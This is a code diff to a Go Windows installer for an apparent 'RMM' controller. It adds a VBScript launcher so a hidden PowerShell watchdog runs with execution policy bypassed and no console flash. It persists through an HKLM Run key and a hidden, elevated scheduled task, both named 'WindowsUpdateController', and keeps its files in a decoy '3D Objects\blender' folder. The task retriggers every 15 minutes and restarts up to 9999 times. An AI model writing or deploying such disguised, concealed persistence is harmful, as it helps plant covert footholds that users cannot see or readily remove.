@@ -35,6 +35,59 @@ func hiddenExec(name string, args ...string) *exec.Cmd {
 	return hideWindow(exec.Command(name, args...))
 }
 
+// controllerWatchdogVbsText launches the watchdog with zero console flash
+// (v1.46.96): wscript never allocates a console, while powershell.exe
+// spawned from Run keys and scheduled tasks pops one on every logon,
+// unlock, and 15-minute repetition. Sits beside the .ps1 and derives its
+// path from its own location (the per-user blender dir varies).
+// MUST match internal/controller watchVbsText (separate binaries; sync).
+const controllerWatchdogVbsText = `' RMM controller watchdog launcher (flash-free: wscript allocates no console).
+Set sh = CreateObject("Wscript.Shell")
+me = WScript.ScriptFullName
+ps1 = Left(me, Len(me) - 4) & ".ps1"
+sh.Run "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1 & """", 0, False
+`
+
+// watchdogRunValue builds the flash-free Run value. Pure, tested.
+func watchdogRunValue(vbsPath string) string {
+	return fmt.Sprintf(`wscript.exe //B //Nologo "%s"`, vbsPath)
+}
+
+// controllerTaskXML renders the watchdog task: logon + 15-min repetition
+// + unlock triggers, hidden, restart-on-failure. The action runs the
+// wscript launcher (v1.46.96: powershell.exe as the task action flashed
+// a console on every fire). Pure, tested.
+func controllerTaskXML(ps1Path string) string {
+	vbs := strings.TrimSuffix(ps1Path, ".ps1") + ".vbs"
+	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
+  <Triggers>
+    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT15M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
+    <SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
+  </Triggers>
+  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+    <RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure>
+  </Settings>
+  <Actions Context="Author"><Exec><Command>wscript</Command><Arguments>//B //Nologo "%s"</Arguments></Exec></Actions>
+</Task>`, vbs)
+}
+
 var (
 	modShell32       = syscall.NewLazyDLL("shell32.dll")
 	procIsUserAdmin  = modShell32.NewProc("IsUserAnAdmin")
@@ -139,6 +192,7 @@ func doUninstall() {
 	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
 	backupDir := filepath.Join(threeDObjects, "blender")
 	_ = os.Remove(filepath.Join(backupDir, "controller-watchdog.ps1"))
+	_ = os.Remove(filepath.Join(backupDir, "controller-watchdog.vbs"))
 	_ = os.Remove(filepath.Join(backupDir, "controller-watchdog.log"))
 	_ = os.Remove(filepath.Join(backupDir, "controller-watchdog.log.1"))
 	_ = os.Remove(filepath.Join(backupDir, "controller-version.txt"))
@@ -375,9 +429,11 @@ while ($true) {
 }
 `, backupDir, installDir, controllerWatchdogLog)
 	_ = os.WriteFile(controllerWatchdogPath, []byte(controllerWatchdogScript), 0644)
+	controllerWatchdogVbs := filepath.Join(backupDir, "controller-watchdog.vbs")
+	_ = os.WriteFile(controllerWatchdogVbs, []byte(controllerWatchdogVbsText), 0644)
 
 	// Run controller watchdog now (Run key + scheduled task cover reboot).
-	cmdWatchdog := hiddenExec("cmd.exe", "/c", "start", "", "/min", "powershell", "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", controllerWatchdogPath)
+	cmdWatchdog := hiddenExec("wscript.exe", "//B", "//Nologo", controllerWatchdogVbs)
 	cmdWatchdog.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow:    true,
 		CreationFlags: 0x08000000,
@@ -385,7 +441,7 @@ while ($true) {
 	_ = cmdWatchdog.Start()
 
 	// HKLM Run key for controller watchdog
-	controllerWatchdogCmd := fmt.Sprintf(`powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"`, controllerWatchdogPath)
+	controllerWatchdogCmd := watchdogRunValue(controllerWatchdogVbs)
 	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
 		_ = k.SetStringValue("WindowsUpdateController", controllerWatchdogCmd)
 		k.Close()
@@ -396,35 +452,8 @@ while ($true) {
 
 	// Scheduled-task fallback so the watchdog survives without waiting for
 	// the next boot (mirrors the agent WindowsUpdateWatchdog task).
-	controllerTaskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
-  <Triggers>
-    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT15M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
-    <SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
-  </Triggers>
-  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-    <RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure>
-  </Settings>
-  <Actions Context="Author"><Exec><Command>powershell</Command><Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"</Arguments></Exec></Actions>
-</Task>`, controllerWatchdogPath)
 	tmpControllerTask := filepath.Join(os.TempDir(), "rmm_controller_watchdog_task.xml")
-	_ = os.WriteFile(tmpControllerTask, []byte(controllerTaskXML), 0644)
+	_ = os.WriteFile(tmpControllerTask, []byte(controllerTaskXML(controllerWatchdogPath)), 0644)
 	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateController", "/f").CombinedOutput()
 	if out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateController", "/xml", tmpControllerTask, "/f").CombinedOutput(); err != nil {
 		fmt.Printf("[!] Controller watchdog task failed: %v %s\n", err, strings.TrimSpace(string(out)))
